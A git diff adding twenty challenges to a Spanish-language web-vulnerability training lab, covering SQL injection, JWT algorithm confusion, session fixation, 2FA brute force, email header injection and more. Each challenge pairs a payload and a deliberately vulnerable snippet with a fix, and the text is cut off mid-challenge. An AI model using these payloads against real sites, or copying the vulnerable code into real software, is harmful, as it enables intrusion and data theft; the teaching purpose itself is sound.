@@ -146,7 +146,7 @@ textarea { resize: vertical; min-height: 70px; }
       <button class="menu-btn" id="menuBtn" onclick="toggleNav()">☰</button>
       <div class="logo">⚡ WebVulnLab</div>
     </div>
-    <div class="score-pill">Resueltos: <span id="scoreVal">0</span> / 28</div>
+    <div class="score-pill">Resueltos: <span id="scoreVal">0</span> / 48</div>
   </header>
   <div class="nav-backdrop" id="navBackdrop" onclick="closeNav()"></div>
   <main>
@@ -181,6 +181,26 @@ textarea { resize: vertical; min-height: 70px; }
       <div class="nav-item" onclick="show('verb')"    id="nav-verb">Verb Tampering <span class="sev sev-med">MED</span></div>
       <div class="nav-item" onclick="show('loginj')"  id="nav-loginj">Log Injection <span class="sev sev-med">MED</span></div>
       <div class="nav-item" onclick="show('hosthdr')" id="nav-hosthdr">Host Hdr Inject <span class="sev sev-high">HIGH</span></div>
+      <div class="nav-item" onclick="show('sqli2')"    id="nav-sqli2">2nd-order SQLi <span class="sev sev-crit">CRIT</span></div>
+      <div class="nav-item" onclick="show('blindsql')" id="nav-blindsql">Blind SQLi <span class="sev sev-high">HIGH</span></div>
+      <div class="nav-item" onclick="show('sessionfix')" id="nav-sessionfix">Session Fixation <span class="sev sev-high">HIGH</span></div>
+      <div class="nav-item" onclick="show('jwtconf')"  id="nav-jwtconf">JWT Alg Confusion <span class="sev sev-high">HIGH</span></div>
+      <div class="nav-item" onclick="show('twofa')"    id="nav-twofa">2FA Brute Force <span class="sev sev-high">HIGH</span></div>
+      <div class="nav-item" onclick="show('oauth')"    id="nav-oauth">OAuth State Bypass <span class="sev sev-med">MED</span></div>
+      <div class="nav-item" onclick="show('prng')"     id="nav-prng">Weak PRNG <span class="sev sev-high">HIGH</span></div>
+      <div class="nav-item" onclick="show('timing')"   id="nav-timing">Timing Attack <span class="sev sev-med">MED</span></div>
+      <div class="nav-item" onclick="show('emailinj')" id="nav-emailinj">Email Hdr Inject <span class="sev sev-med">MED</span></div>
+      <div class="nav-item" onclick="show('hpp')"      id="nav-hpp">HTTP Param Pollution <span class="sev sev-med">MED</span></div>
+      <div class="nav-item" onclick="show('ede')"      id="nav-ede">Excessive Data Exp <span class="sev sev-med">MED</span></div>
+      <div class="nav-item" onclick="show('debug')"    id="nav-debug">Debug Endpoint <span class="sev sev-med">MED</span></div>
+      <div class="nav-item" onclick="show('stacktrace')" id="nav-stacktrace">Stack Trace <span class="sev sev-med">MED</span></div>
+      <div class="nav-item" onclick="show('nosalt')"   id="nav-nosalt">Hash sin sal <span class="sev sev-high">HIGH</span></div>
+      <div class="nav-item" onclick="show('cookie')"   id="nav-cookie">Cookie Flags <span class="sev sev-med">MED</span></div>
+      <div class="nav-item" onclick="show('domxss')"   id="nav-domxss">DOM XSS <span class="sev sev-crit">CRIT</span></div>
+      <div class="nav-item" onclick="show('domclob')"  id="nav-domclob">DOM Clobbering <span class="sev sev-med">MED</span></div>
+      <div class="nav-item" onclick="show('ssrf2')"    id="nav-ssrf2">Stored SSRF <span class="sev sev-high">HIGH</span></div>
+      <div class="nav-item" onclick="show('zipslip')"  id="nav-zipslip">Zip Slip <span class="sev sev-high">HIGH</span></div>
+      <div class="nav-item" onclick="show('sri')"      id="nav-sri">SRI Ausente <span class="sev sev-med">MED</span></div>
     </aside>
 
     <div class="content">
@@ -1128,6 +1148,674 @@ const link = `${BASE_URL}/reset?token=${token}`;
         </div>
       </div>
 
+      <!-- SECOND-ORDER SQLI -->
+      <div id="page-sqli2" class="challenge-box" style="display:none">
+        <div class="ch-header">
+          <div class="ch-title">🗄️ Second-order SQL Injection</div>
+          <span class="sev sev-crit" style="font-size:11px;padding:3px 8px;border-radius:4px">CRIT</span>
+        </div>
+        <div class="ch-desc">El payload se almacena de forma segura con prepared statements (Fase 1), pero cuando el valor almacenado se recupera y usa en una nueva query sin sanitizar (Fase 2), ocurre la inyección. El WAF ve datos seguros entrando — el exploit se dispara después.</div>
+        <div class="step-label">Fase 1 — Almacenar payload (aparentemente seguro)</div>
+        <div class="split" style="margin-bottom:10px">
+          <div class="form-group" style="margin:0"><label>user_id (2 = jsmith)</label><input id="sqli2-uid" value="2" /></div>
+          <div class="form-group" style="margin:0"><label>Nuevo username (payload)</label><input id="sqli2-uname" value="' UNION SELECT id,username,password,email,role,secret FROM users--" /></div>
+        </div>
+        <button class="btn btn-amber" onclick="doSQLi2Store()">POST /api/update-username</button>
+        <div class="output" id="sqli2-store-out">— Resultado almacenamiento —</div>
+        <div class="step-label">Fase 2 — Trigger: recuperar datos del usuario</div>
+        <button class="btn btn-red" onclick="doSQLi2Greet()">GET /api/greet?id=2</button>
+        <div class="output" id="sqli2-out">— Resultado (inyección disparada) —</div>
+        <div class="flag" id="flag-sqli2">🚩 FLAG{second_order_sqli} — Payload almacenado ejecutado en segunda query</div>
+        <button class="hint-btn" onclick="toggleHint('sqli2')">💡 Mostrar pista</button>
+        <div class="hint-box" id="hint-sqli2">
+          El username se guarda con <code>?</code> (seguro). Luego se recupera y se pega en una nueva query con concatenación de strings.<br>
+          Payload: <code>' UNION SELECT id,username,password,email,role,secret FROM users--</code><br>
+          <code>Fix:</code> Usar prepared statements en TODAS las queries, no solo en la de inserción.
+        </div>
+        <div class="code-block" style="margin-top:14px">
+<span class="dim">// Fase 1: seguro (prepared statement)</span>
+db.query('UPDATE users SET username = ? WHERE id = ?', [username, id]);
+
+<span class="vuln">// Fase 2: VULNERABLE — usa el valor almacenado sin escapar</span>
+const query = `SELECT * FROM users WHERE username = '${username}'`;
+<span class="dim">// username viene de la BD — parece seguro, pero contiene el payload</span>
+
+<span class="fix">// FIX: usar prepared statement también en Fase 2</span>
+db.query('SELECT * FROM users WHERE username = ?', [username]);
+        </div>
+      </div>
+
+      <!-- BLIND SQLI -->
+      <div id="page-blindsql" class="challenge-box" style="display:none">
+        <div class="ch-header">
+          <div class="ch-title">🕶️ Blind SQL Injection — Extracción booleana</div>
+          <span class="sev sev-high" style="font-size:11px;padding:3px 8px;border-radius:4px">HIGH</span>
+        </div>
+        <div class="ch-desc">El endpoint solo devuelve <code style="color:#5DCAA5">true</code> o <code style="color:#5DCAA5">false</code> — no muestra datos. Pero al ser vulnerable a SQLi, puedes extraer datos caracter por caracter haciendo preguntas booleanas: ¿El primer caracter de la password es 's'?</div>
+        <div class="form-group"><label>GET /api/user-exists?username=</label><input id="blindsql-q" value="admin" /></div>
+        <div style="display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap">
+          <button class="btn" onclick="doBlindSQL()">Verificar existencia</button>
+          <button class="btn btn-amber" onclick="$('blindsql-q').value=&quot;admin' AND SUBSTRING(password,1,1)='s&quot;">Cargar payload booleano</button>
+          <button class="btn btn-red" onclick="doBlindBrute()">⚡ Auto-extraer password</button>
+        </div>
+        <div class="output" id="blindsql-out">— Resultado (solo true/false) —</div>
+        <div class="flag" id="flag-blindsql">🚩 FLAG{blind_sqli} — Password extraída caracter por caracter via Blind SQLi</div>
+        <button class="hint-btn" onclick="toggleHint('blindsql')">💡 Mostrar pista</button>
+        <div class="hint-box" id="hint-blindsql">
+          Prueba: <code>admin' AND SUBSTRING(password,1,1)='s</code><br>
+          Si devuelve <code>exists: true</code> → el primer caracter es 's'.<br>
+          El botón "Auto-extraer" automatiza esto para toda la password.<br>
+          <code>Fix:</code> Usar prepared statements. <code>db.query('... WHERE username = ?', [username])</code>
+        </div>
+        <div class="code-block" style="margin-top:14px">
+<span class="vuln">// VULNERABLE: concatenación directa</span>
+const query = `SELECT COUNT(*) FROM users WHERE username = '${username}'`;
+<span class="dim">// payload: admin' AND SUBSTRING(password,1,1)='s</span>
+<span class="dim">// → SELECT COUNT(*) FROM users WHERE username = 'admin' AND SUBSTRING(password,1,1)='s'</span>
+
+<span class="fix">// FIX: prepared statement</span>
+db.query('SELECT COUNT(*) FROM users WHERE username = ?', [username]);
+        </div>
+      </div>
+
+      <!-- SESSION FIXATION -->
+      <div id="page-sessionfix" class="challenge-box" style="display:none">
+        <div class="ch-header">
+          <div class="ch-title">🔐 Session Fixation — Secuestro de sesión</div>
+          <span class="sev sev-high" style="font-size:11px;padding:3px 8px;border-radius:4px">HIGH</span>
+        </div>
+        <div class="ch-desc">El servidor acepta el Session ID propuesto por el cliente en el login. Un atacante puede fijar un SID conocido, hacer que la víctima se autentique con ese SID, y luego usar ese mismo SID para acceder a la sesión de la víctima.</div>
+        <div class="step-label">Paso 1 — Atacante fija el Session ID</div>
+        <div class="form-group"><label>SID malicioso (el atacante lo elige)</label><input id="sessionfix-sid" value="ATTACKER_FIXED_SID_123" /></div>
+        <div class="step-label">Paso 2 — Víctima hace login (con el SID fijado)</div>
+        <div class="split" style="margin-bottom:10px">
+          <div class="form-group" style="margin:0"><label>Username víctima</label><input id="sessionfix-user" value="jsmith" /></div>
+          <div class="form-group" style="margin:0"><label>Password víctima</label><input id="sessionfix-pass" value="password123" /></div>
+        </div>
+        <button class="btn btn-red" onclick="doSessionFixLogin()">POST /api/session/login (con SID del atacante)</button>
+        <div class="output" id="sessionfix-login-out">— Resultado del login —</div>
+        <div class="step-label">Paso 3 — Atacante accede con el SID conocido</div>
+        <button class="btn btn-amber" onclick="doSessionFixHijack()">GET /api/session/profile (usando SID conocido)</button>
+        <div class="output" id="sessionfix-out">— Sesión secuestrada —</div>
+        <div class="flag" id="flag-sessionfix">🚩 FLAG{session_fixation_hijack} — Sesión de la víctima secuestrada con SID conocido</div>
+        <button class="hint-btn" onclick="toggleHint('sessionfix')">💡 Mostrar pista</button>
+        <div class="hint-box" id="hint-sessionfix">
+          El atacante sabe el SID porque lo fijó él mismo antes del login.<br>
+          Al autenticarse la víctima, el SID queda asociado a su sesión.<br>
+          El atacante usa ese SID → accede como la víctima.<br>
+          <code>Fix:</code> Generar siempre un nuevo SID aleatorio tras el login, ignorando cualquier SID del cliente.
+        </div>
+        <div class="code-block" style="margin-top:14px">
+<span class="vuln">// VULNERABLE: acepta SID del cliente</span>
+const sessionId = req.body.sid || crypto.randomBytes(16).toString('hex');
+sessions[sessionId] = { userId: user.id, ... };
+
+<span class="fix">// FIX: generar siempre un SID nuevo (ignorar el del cliente)</span>
+const sessionId = crypto.randomBytes(32).toString('hex');
+sessions[sessionId] = { userId: user.id, ... };
+        </div>
+      </div>
+
+      <!-- JWT ALGORITHM CONFUSION -->
+      <div id="page-jwtconf" class="challenge-box" style="display:none">
+        <div class="ch-header">
+          <div class="ch-title">🔑 JWT Algorithm Confusion — RS256 → HS256</div>
+          <span class="sev sev-high" style="font-size:11px;padding:3px 8px;border-radius:4px">HIGH</span>
+        </div>
+        <div class="ch-desc">El servidor firma tokens con RS256 (clave privada RSA) pero acepta también HS256. Un atacante puede usar la clave <em>pública</em> RSA (que es pública) como secreto HMAC para forjar un token HS256 con role:admin — y el servidor lo verifica como válido.</div>
+        <div class="step-label">Paso 1 — Obtener token RS256 legítimo</div>
+        <div class="split" style="margin-bottom:6px">
+          <div class="form-group" style="margin:0"><label>Username</label><input id="jwtconf-user" value="jsmith" /></div>
+          <div class="form-group" style="margin:0"><label>Password</label><input id="jwtconf-pass" value="password123" /></div>
+        </div>
+        <button class="btn" onclick="doJWTConfToken()">POST /api/rs256/token</button>
+        <div class="token-box" id="jwtconf-token-box">— token RS256 —</div>
+        <div class="step-label">Paso 2 — Ver la clave pública RSA</div>
+        <button class="btn" onclick="doJWTConfPubkey()">GET /api/rs256/pubkey</button>
+        <div class="output" id="jwtconf-pubkey-out">— Clave pública —</div>
+        <div class="step-label">Paso 3 — Forjar token HS256 con role:admin</div>
+        <button class="btn btn-amber" onclick="doJWTConfForge()">POST /api/rs256/forge (payload: role:admin)</button>
+        <div class="token-box" id="jwtconf-forged-box">— token forjado HS256 —</div>
+        <div class="step-label">Paso 4 — Acceder al endpoint protegido</div>
+        <button class="btn btn-red" onclick="doJWTConfFlag()">GET /api/rs256/flag (con token forjado)</button>
+        <div class="output" id="jwtconf-out">— Resultado —</div>
+        <div class="flag" id="flag-jwtconf">🚩 FLAG{jwt_algorithm_confusion} — Token HS256 forjado con clave pública RSA aceptado</div>
+        <button class="hint-btn" onclick="toggleHint('jwtconf')">💡 Mostrar pista</button>
+        <div class="hint-box" id="hint-jwtconf">
+          La vulnerabilidad: el servidor acepta <code>algorithms: ['RS256', 'HS256']</code>.<br>
+          Al verificar un token HS256, usa la clave pública RSA como secreto HMAC.<br>
+          El atacante conoce la clave pública → puede firmar tokens HS256 válidos.<br>
+          <code>Fix:</code> Aceptar solo el algoritmo esperado: <code>{ algorithms: ['RS256'] }</code>
+        </div>
+        <div class="code-block" style="margin-top:14px">
+<span class="vuln">// VULNERABLE: acepta RS256 y HS256</span>
+jwt.verify(token, rsaPublicPem, { algorithms: ['RS256', 'HS256'] });
+<span class="dim">// Con HS256: usa rsaPublicPem como secreto → el atacante puede firmarlo</span>
+
+<span class="fix">// FIX: aceptar solo RS256</span>
+jwt.verify(token, rsaPublicPem, { algorithms: ['RS256'] });
+        </div>
+      </div>
+
+      <!-- 2FA BRUTE FORCE -->
+      <div id="page-twofa" class="challenge-box" style="display:none">
+        <div class="ch-header">
+          <div class="ch-title">🔢 2FA Brute Force — PIN de 4 dígitos sin rate limiting</div>
+          <span class="sev sev-high" style="font-size:11px;padding:3px 8px;border-radius:4px">HIGH</span>
+        </div>
+        <div class="ch-desc">El sistema de 2FA genera un PIN de solo 4 dígitos (10.000 combinaciones) y no implementa ningún límite de intentos ni bloqueo. Un atacante puede probar todos los PINs posibles en segundos.</div>
+        <button class="btn" onclick="do2FASetup()" style="margin-bottom:10px">POST /api/2fa/setup (generar PIN)</button>
+        <div class="output" id="twofa-setup-out">— PIN generado (oculto al atacante en escenario real) —</div>
+        <button class="btn btn-red" onclick="do2FABrute()" style="margin-top:8px">⚡ Brute Force (0000-9999) — sin rate limit</button>
+        <div class="output" id="twofa-out">— Resultado del brute force —</div>
+        <div class="flag" id="flag-twofa">🚩 FLAG{2fa_brute_force} — PIN encontrado por fuerza bruta</div>
+        <button class="hint-btn" onclick="toggleHint('twofa')">💡 Mostrar pista</button>
+        <div class="hint-box" id="hint-twofa">
+          El servidor no limita intentos → se puede probar 0000, 0001, ... hasta 9999.<br>
+          El espacio de 10.000 valores se agota en segundos con fetch() en un loop.<br>
+          <code>Fix:</code> Máximo 3-5 intentos, bloqueo de cuenta, expiración del PIN (30-60s), PIN de 6+ dígitos.
+        </div>
+        <div class="code-block" style="margin-top:14px">
+<span class="vuln">// VULNERABLE: sin rate limiting ni lockout</span>
+app.post('/api/2fa/verify', (req, res) => {
+  if (code === data.pin) res.json({ success: true });
+  else res.json({ success: false }); <span class="dim">// inténtalo de nuevo, sin límite</span>
+});
+
+<span class="fix">// FIX: máximo intentos + expiración</span>
+if (data.attempts >= 5) return res.status(429).json({ error: 'Cuenta bloqueada' });
+if (Date.now() - data.created > 60000) return res.status(400).json({ error: 'PIN expirado' });
+        </div>
+      </div>
+
+      <!-- OAUTH STATE -->
+      <div id="page-oauth" class="challenge-box" style="display:none">
+        <div class="ch-header">
+          <div class="ch-title">🔄 OAuth State Bypass — CSRF en flujo OAuth</div>
+          <span class="sev sev-med" style="font-size:11px;padding:3px 8px;border-radius:4px">MED</span>
+        </div>
+        <div class="ch-desc">El parámetro <code style="color:#5DCAA5">state</code> en OAuth 2.0 previene CSRF. Si no se incluye (o no se verifica en el callback), un atacante puede iniciar un flujo OAuth y hacer que la víctima complete el callback — vinculando la cuenta del atacante a la cuenta de la víctima.</div>
+        <div class="step-label">Paso 1 — Authorize SIN state (flujo vulnerable)</div>
+        <div class="form-group"><label>redirect_uri</label><input id="oauth-redir" value="https://app.com/callback" /></div>
+        <button class="btn btn-red" onclick="doOAuthAuthorize()">GET /api/oauth/authorize (sin state)</button>
+        <div class="output" id="oauth-authorize-out">— Código de autorización —</div>
+        <div class="step-label">Paso 2 — Callback (sin verificar state)</div>
+        <button class="btn btn-amber" onclick="doOAuthCallback()">GET /api/oauth/callback (con código generado)</button>
+        <div class="output" id="oauth-out">— Resultado —</div>
+        <div class="flag" id="flag-oauth">🚩 FLAG{oauth_state_missing} — OAuth completado sin verificación CSRF</div>
+        <button class="hint-btn" onclick="toggleHint('oauth')">💡 Mostrar pista</button>
+        <div class="hint-box" id="hint-oauth">
+          Escenario de ataque: el atacante genera un <code>authorize</code> URL sin state.<br>
+          Envía esa URL a la víctima. La víctima completa el callback.<br>
+          El callback vincula las credenciales del atacante a la cuenta de la víctima.<br>
+          <code>Fix:</code> Generar un state aleatorio criptográfico, verificar que el state del callback coincide.
+        </div>
+        <div class="code-block" style="margin-top:14px">
+<span class="vuln">// VULNERABLE: no verifica state en callback</span>
+app.get('/oauth/callback', (req, res) => {
+  const { code } = req.query; <span class="dim">// state ignorado</span>
+  exchangeCode(code);
+});
+
+<span class="fix">// FIX: verificar state</span>
+app.get('/oauth/callback', (req, res) => {
+  if (req.query.state !== session.oauthState) return res.status(403).send('CSRF detected');
+  exchangeCode(req.query.code);
+});
+        </div>
+      </div>
+
+      <!-- WEAK PRNG -->
+      <div id="page-prng" class="challenge-box" style="display:none">
+        <div class="ch-header">
+          <div class="ch-title">🎲 Weak PRNG — Math.random() no es criptográfico</div>
+          <span class="sev sev-high" style="font-size:11px;padding:3px 8px;border-radius:4px">HIGH</span>
+        </div>
+        <div class="ch-desc"><code style="color:#5DCAA5">Math.random()</code> en V8 usa xorshift128+, un algoritmo predecible. Con suficientes muestras del output, el estado interno puede recuperarse y predecir tokens futuros. No usar para tokens de sesión, reset de contraseña o cualquier valor que deba ser secreto.</div>
+        <button class="btn" onclick="doPRNGToken()" style="margin-bottom:8px">POST /api/prng/token (generar token inseguro)</button>
+        <div class="output" id="prng-token-out">— Token generado con Math.random() —</div>
+        <button class="btn btn-amber" onclick="doPRNGSamples()" style="margin-top:8px">GET /api/prng/samples (ver 10 muestras del patrón)</button>
+        <div class="output" id="prng-out">— 10 tokens consecutivos —</div>
+        <div class="flag" id="flag-prng">🚩 FLAG{weak_prng_math_random} — Tokens predecibles generados con Math.random()</div>
+        <button class="hint-btn" onclick="toggleHint('prng')">💡 Mostrar pista</button>
+        <div class="hint-box" id="hint-prng">
+          V8 usa xorshift128+ para <code>Math.random()</code> — rápido pero no apto para criptografía.<br>
+          Con ~5 outputs consecutivos se puede recuperar el estado completo de 128 bits.<br>
+          Herramienta: <a href="https://github.com/nicowillis/v8-randomness-predictor" style="color:#5DCAA5">v8-randomness-predictor</a><br>
+          <code>Fix:</code> Usar <code>crypto.randomBytes(32).toString('hex')</code> para tokens secretos.
+        </div>
+        <div class="code-block" style="margin-top:14px">
+<span class="vuln">// VULNERABLE: Math.random() predecible</span>
+const token = Math.random().toString(36).substring(2, 10);
+<span class="dim">// Entropía: ~41 bits — recuperable con análisis de salidas</span>
+
+<span class="fix">// FIX: CSPRNG</span>
+const token = require('crypto').randomBytes(32).toString('hex');
+<span class="dim">// Entropía: 256 bits — computacionalmente imposible de predecir</span>
+        </div>
+      </div>
+
+      <!-- TIMING ATTACK -->
+      <div id="page-timing" class="challenge-box" style="display:none">
+        <div class="ch-header">
+          <div class="ch-title">⏱️ Timing Attack — Comparación no constante</div>
+          <span class="sev sev-med" style="font-size:11px;padding:3px 8px;border-radius:4px">MED</span>
+        </div>
+        <div class="ch-desc">La comparación de strings sale del bucle al primer caracter incorrecto (early exit). Medir el tiempo de respuesta revela cuántos caracteres son correctos. El secreto tiene un delay artificial de 1ms por caracter correcto para hacer la diferencia visible.</div>
+        <div class="form-group"><label>Intento (guess)</label><input id="timing-guess" value="a" /></div>
+        <div style="display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap">
+          <button class="btn" onclick="doTiming()">POST /api/timing/check</button>
+          <button class="btn btn-red" onclick="doTimingBrute()">⚡ Auto-extraer secreto por timing</button>
+        </div>
+        <div class="output" id="timing-out">— Tiempo de respuesta —</div>
+        <div class="flag" id="flag-timing">🚩 FLAG{timing_attack_secret_found} — Secreto extraído midiendo tiempos de respuesta</div>
+        <button class="hint-btn" onclick="toggleHint('timing')">💡 Mostrar pista</button>
+        <div class="hint-box" id="hint-timing">
+          Prueba con <code>a</code>, luego <code>v</code>, <code>vu</code>, etc.<br>
+          Cuando el tiempo aumenta bruscamente, ese caracter es correcto.<br>
+          El secreto empieza por <code>v</code> — sigue el timing.<br>
+          <code>Fix:</code> Usar <code>crypto.timingSafeEqual()</code> para comparaciones de secretos.
+        </div>
+        <div class="code-block" style="margin-top:14px">
+<span class="vuln">// VULNERABLE: early-exit leak</span>
+for (let i = 0; i &lt; SECRET.length; i++) {
+  if (guess[i] !== SECRET[i]) { match = false; break; } <span class="dim">// sale aquí</span>
+}
+
+<span class="fix">// FIX: comparación en tiempo constante</span>
+const a = Buffer.from(guess.padEnd(SECRET.length));
+const b = Buffer.from(SECRET);
+const ok = crypto.timingSafeEqual(a, b);
+        </div>
+      </div>
+
+      <!-- EMAIL HEADER INJECTION -->
+      <div id="page-emailinj" class="challenge-box" style="display:none">
+        <div class="ch-header">
+          <div class="ch-title">📧 Email Header Injection</div>
+          <span class="sev sev-med" style="font-size:11px;padding:3px 8px;border-radius:4px">MED</span>
+        </div>
+        <div class="ch-desc">Los campos <code style="color:#5DCAA5">email</code> y <code style="color:#5DCAA5">name</code> del formulario se concatenan directamente en los headers del email sin sanitizar. Inyectando <code style="color:#5DCAA5">\r\n</code> (CRLF) se pueden añadir headers adicionales como <code style="color:#5DCAA5">Bcc:</code> para copiar el mensaje a cualquier destino.</div>
+        <div class="form-group"><label>Nombre</label><input id="emailinj-name" value="Test User" /></div>
+        <div class="form-group"><label>Email (con payload inyectado)</label><input id="emailinj-email" value="victim@corp.com&#13;&#10;Bcc: attacker@evil.com" /></div>
+        <div class="form-group"><label>Mensaje</label><textarea id="emailinj-msg">Mensaje de contacto normal</textarea></div>
+        <button class="btn btn-red" onclick="doEmailInj()">POST /api/contact</button>
+        <div class="output" id="emailinj-out">— Headers del email generado —</div>
+        <div class="flag" id="flag-emailinj">🚩 FLAG{email_header_injection} — Headers de email inyectados con CRLF</div>
+        <button class="hint-btn" onclick="toggleHint('emailinj')">💡 Mostrar pista</button>
+        <div class="hint-box" id="hint-emailinj">
+          El payload en email: <code>victim@corp.com\r\nBcc: attacker@evil.com</code><br>
+          El servidor inserta eso en <code>From: [email]</code> → añade una línea Bcc.<br>
+          Resultado: todos los contactos llegan también a attacker@evil.com.<br>
+          <code>Fix:</code> Validar que email/name no contengan <code>\r</code> ni <code>\n</code>. Usar librerías de mail como nodemailer que escapan automáticamente.
+        </div>
+        <div class="code-block" style="margin-top:14px">
+<span class="vuln">// VULNERABLE: concatenación en headers</span>
+const headers = `From: ${email}\r\nTo: admin@corp.com`;
+<span class="dim">// email = "x@x.com\r\nBcc: evil@evil.com"</span>
+<span class="dim">// → From: x@x.com</span>
+<span class="dim">// → Bcc: evil@evil.com  ← inyectado</span>
+<span class="dim">// → To: admin@corp.com</span>
+
+<span class="fix">// FIX: rechazar inputs con CRLF</span>
+if (/[\r\n]/.test(email) || /[\r\n]/.test(name)) return res.status(400).json({ error: 'Input inválido' });
+        </div>
+      </div>
+
+      <!-- HTTP PARAMETER POLLUTION -->
+      <div id="page-hpp" class="challenge-box" style="display:none">
+        <div class="ch-header">
+          <div class="ch-title">🌀 HTTP Parameter Pollution (HPP)</div>
+          <span class="sev sev-med" style="font-size:11px;padding:3px 8px;border-radius:4px">MED</span>
+        </div>
+        <div class="ch-desc">Cuando un parámetro se repite en la URL (<code style="color:#5DCAA5">?id=5&amp;id=1</code>), diferentes componentes del sistema pueden interpretarlo diferente. Un WAF puede ver el primer valor (5, inofensivo) mientras la aplicación usa el último (1, el admin).</div>
+        <div class="form-group"><label>Primer id (WAF ve este)</label><input id="hpp-id1" value="5" /></div>
+        <div class="form-group"><label>Segundo id (app usa este)</label><input id="hpp-id2" value="1" /></div>
+        <button class="btn btn-red" onclick="doHPP()">GET /api/items?id={id1}&amp;id={id2}</button>
+        <div class="output" id="hpp-out">— Resultado —</div>
+        <div class="flag" id="flag-hpp">🚩 FLAG{http_param_pollution} — WAF bypass via parámetros duplicados</div>
+        <button class="hint-btn" onclick="toggleHint('hpp')">💡 Mostrar pista</button>
+        <div class="hint-box" id="hint-hpp">
+          Con <code>?id=5&amp;id=1</code>: Express recibe <code>id = ['5', '1']</code>.<br>
+          Un WAF que solo revisa el primero (<code>5</code>) lo ve como seguro.<br>
+          La app usa el último (<code>1</code> = admin) → acceso no autorizado.<br>
+          <code>Fix:</code> Normalizar parámetros antes de procesarlos, rechazar duplicados.
+        </div>
+        <div class="code-block" style="margin-top:14px">
+<span class="vuln">// VULNERABLE: Express recibe array sin validar</span>
+const id = req.query.id; <span class="dim">// puede ser '5' o ['5','1']</span>
+db.query('... WHERE id = ?', [Array.isArray(id) ? id[id.length-1] : id]);
+<span class="dim">// WAF ve '5', app usa '1'</span>
+
+<span class="fix">// FIX: rechazar si id es array</span>
+if (Array.isArray(req.query.id)) return res.status(400).json({ error: 'Parámetro duplicado no permitido' });
+        </div>
+      </div>
+
+      <!-- EXCESSIVE DATA EXPOSURE -->
+      <div id="page-ede" class="challenge-box" style="display:none">
+        <div class="ch-header">
+          <div class="ch-title">📤 Excessive Data Exposure</div>
+          <span class="sev sev-med" style="font-size:11px;padding:3px 8px;border-radius:4px">MED</span>
+        </div>
+        <div class="ch-desc">La API devuelve el objeto completo de la base de datos (usando <code style="color:#5DCAA5">SELECT *</code>) incluyendo campos sensibles como <code style="color:#5DCAA5">password</code>, <code style="color:#5DCAA5">secret</code> y datos internos que nunca deberían enviarse al cliente.</div>
+        <button class="btn btn-red" onclick="doEDE()">GET /api/users/all</button>
+        <div class="output" id="ede-out">— Todos los usuarios con TODOS sus campos —</div>
+        <div class="flag" id="flag-ede">🚩 FLAG{excessive_data_exposure} — Passwords y datos sensibles expuestos en la API</div>
+        <button class="hint-btn" onclick="toggleHint('ede')">💡 Mostrar pista</button>
+        <div class="hint-box" id="hint-ede">
+          El endpoint usa <code>SELECT *</code> → devuelve todos los campos.<br>
+          Incluye: <code>password</code>, <code>secret</code>, campos internos.<br>
+          El cliente solo debería recibir lo que necesita (id, username, email).<br>
+          <code>Fix:</code> Seleccionar solo campos necesarios: <code>SELECT id, username, email FROM users</code>.
+        </div>
+        <div class="code-block" style="margin-top:14px">
+<span class="vuln">// VULNERABLE: SELECT * devuelve todo</span>
+db.query('SELECT * FROM users', (err, results) => res.json(results));
+<span class="dim">// Devuelve: id, username, email, password, role, secret, ...</span>
+
+<span class="fix">// FIX: seleccionar solo campos necesarios</span>
+db.query('SELECT id, username, email FROM users', (err, results) => res.json(results));
+        </div>
+      </div>
+
+      <!-- DEBUG ENDPOINT -->
+      <div id="page-debug" class="challenge-box" style="display:none">
+        <div class="ch-header">
+          <div class="ch-title">🐛 Debug Endpoint Expuesto</div>
+          <span class="sev sev-med" style="font-size:11px;padding:3px 8px;border-radius:4px">MED</span>
+        </div>
+        <div class="ch-desc">Un endpoint de debug dejado activo en producción expone variables de entorno, credenciales de base de datos, versión de Node.js, rutas del servidor y otra información que facilita enormemente ataques posteriores.</div>
+        <button class="btn btn-red" onclick="doDebug()">GET /api/debug</button>
+        <div class="output" id="debug-out">— Información interna del servidor —</div>
+        <div class="flag" id="flag-debug">🚩 FLAG{debug_endpoint_exposed} — Variables de entorno y configuración interna filtradas</div>
+        <button class="hint-btn" onclick="toggleHint('debug')">💡 Mostrar pista</button>
+        <div class="hint-box" id="hint-debug">
+          El endpoint expone <code>process.env</code> completo — incluyendo contraseñas de BD, API keys, etc.<br>
+          También: rutas del sistema, PID, versión de Node, uso de memoria.<br>
+          Esta información es oro para un atacante (OS, framework versions para CVEs).<br>
+          <code>Fix:</code> Eliminar endpoints de debug en producción. Usar feature flags o autenticación fuerte si son necesarios.
+        </div>
+        <div class="code-block" style="margin-top:14px">
+<span class="vuln">// VULNERABLE: endpoint debug sin protección</span>
+app.get('/api/debug', (req, res) => {
+  res.json({ env: process.env, cwd: process.cwd(), pid: process.pid });
+});
+
+<span class="fix">// FIX: eliminar o proteger con auth interna</span>
+<span class="dim">// En producción: eliminar completamente</span>
+<span class="dim">// En staging: requiere IP whitelist o token interno</span>
+if (process.env.NODE_ENV === 'production') return res.status(404);
+        </div>
+      </div>
+
+      <!-- STACK TRACE DISCLOSURE -->
+      <div id="page-stacktrace" class="challenge-box" style="display:none">
+        <div class="ch-header">
+          <div class="ch-title">📚 Stack Trace Disclosure</div>
+          <span class="sev sev-med" style="font-size:11px;padding:3px 8px;border-radius:4px">MED</span>
+        </div>
+        <div class="ch-desc">Cuando ocurre un error, el servidor devuelve el stack trace completo al cliente. Esto revela rutas internas del servidor, nombres de archivos, líneas de código y la estructura del proyecto — información valiosa para planear ataques.</div>
+        <div class="form-group"><label>Input (JSON inválido o que cause TypeError)</label><input id="stacktrace-input" value='{"x":1}' /></div>
+        <button class="btn btn-red" onclick="doStackTrace()">GET /api/crash?input=</button>
+        <div class="output" id="stacktrace-out">— Stack trace del servidor —</div>
+        <div class="flag" id="flag-stacktrace">🚩 FLAG{stack_trace_disclosure} — Rutas y estructura interna del servidor reveladas</div>
+        <button class="hint-btn" onclick="toggleHint('stacktrace')">💡 Mostrar pista</button>
+        <div class="hint-box" id="hint-stacktrace">
+          Envía <code>{"x":1}</code> → el código intenta acceder a <code>obj.a.b.c</code> → TypeError.<br>
+          El servidor devuelve <code>error.stack</code> que contiene rutas de archivos del servidor.<br>
+          Un atacante puede ver: <code>/app/server.js:123</code>, versiones de módulos, etc.<br>
+          <code>Fix:</code> En producción, log interno del stack pero respuesta genérica al cliente: <code>{ error: 'Internal Server Error' }</code>
+        </div>
+        <div class="code-block" style="margin-top:14px">
+<span class="vuln">// VULNERABLE: expone stack al cliente</span>
